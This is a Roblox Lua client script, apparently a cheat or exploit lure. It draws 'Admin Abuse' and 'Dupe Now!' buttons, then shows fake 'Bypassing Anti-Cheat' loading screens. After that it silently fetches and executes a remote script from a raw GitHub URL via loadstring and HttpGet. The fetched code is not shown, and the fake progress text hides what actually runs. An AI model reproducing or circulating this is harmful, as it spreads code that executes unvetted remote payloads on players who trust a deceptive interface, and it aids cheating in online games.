-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- MAIN GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", mainGui)
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.05
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local layout = Instance.new("UIListLayout", mainFrame)
layout.Padding = UDim.new(0, 10)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

-- "Please Wait" small label (hidden by default)
local waitGui = Instance.new("TextLabel")
waitGui.Parent = mainGui
waitGui.Size = UDim2.new(0, 200, 0, 50)
waitGui.Position = UDim2.new(0.5, -100, 0.5, -100)
waitGui.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
waitGui.Text = "Please wait..."
waitGui.Font = Enum.Font.Cartoon
waitGui.TextSize = 30
waitGui.TextColor3 = Color3.new(1, 1, 1)
waitGui.BackgroundTransparency = 0.2
waitGui.Visible = false
Instance.new("UICorner", waitGui).CornerRadius = UDim.new(0, 10)

-- FUNCTION: Create Fullscreen Loading Screen
local function createFullscreenLoading(message)
	local screen = Instance.new("ScreenGui", playerGui)
	screen.Name = "FullLoadingScreen"
	screen.ResetOnSpawn = false

	local frame = Instance.new("Frame", screen)
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Text = message
	label.Font = Enum.Font.Cartoon
	label.TextSize = 40
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.BackgroundTransparency = 1
	label.TextTransparency = 0

	return screen, frame, label
end

-- FUNCTION: Create Button
local function createButton(name)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.Cartoon
	btn.TextSize = 24
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
	btn.AutoButtonColor = true
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
	return btn
end

-- FUNCTION: Handle Button Logic
local function onButtonClick(button, loadingMessage)
	-- Shrink animation
	local shrinkTween = TweenService:Create(button, TweenInfo.new(0.3), {
		Size = UDim2.new(0.8, 0, 0, 0),
		TextTransparency = 1
	})
	shrinkTween:Play()
	shrinkTween.Completed:Wait()

	waitGui.Visible = true
	wait(2)

	-- Hide main GUI
	mainGui.Enabled = false
	waitGui.Visible = false

	-- Show fullscreen loading
	local screen, frame, label = createFullscreenLoading(loadingMessage)
	wait(10) -- Hold loading for 10 seconds

	-- Fade out loading screen
	TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
	TweenService:Create(label, TweenInfo.new(1), {TextTransparency = 1}):Play()
	wait(1.1)
	screen:Destroy()

	-- Load external script
	pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
	end)

	-- Placeholder final UI
	local finalGui = Instance.new("ScreenGui", playerGui)
	finalGui.Name = "FinalUI"

	local finalMsg = Instance.new("TextLabel", finalGui)
	finalMsg.Size = UDim2.new(0.5, 0, 0.1, 0)
	finalMsg.Position = UDim2.new(0.5, -150, 0.5, -25)
	finalMsg.Text = "Module Loaded!"
	finalMsg.Font = Enum.Font.Cartoon
	finalMsg.TextSize = 36
	finalMsg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	finalMsg.TextColor3 = Color3.new(1, 1, 1)
	Instance.new("UICorner", finalMsg).CornerRadius = UDim.new(0, 10)
end

-- Create and bind buttons
local adminButton = createButton("Admin Abuse")
adminButton.MouseButton1Click:Connect(function()
	onButtonClick(adminButton, "Bypassing Command Panel Please Wait.")
end)

local dupeButton = createButton("Dupe Now!")
dupeButton.MouseButton1Click:Connect(function()
	onButtonClick(dupeButton, "Bypassing Duping Anti-Cheat Please Wait.")
end)
